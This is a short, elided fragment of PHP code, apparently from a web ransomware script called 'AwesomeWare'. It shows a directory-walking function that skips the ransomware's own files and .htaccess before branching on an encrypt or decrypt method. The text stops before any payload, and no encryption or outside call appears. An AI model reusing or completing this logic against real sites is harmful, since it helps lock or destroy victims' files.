   ...
   public function shcdirs($dir,$method,$key){
        ...
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                ...
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"AwesomeWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".n00bcut") ){
                     switch ($method) {
                        case '1':
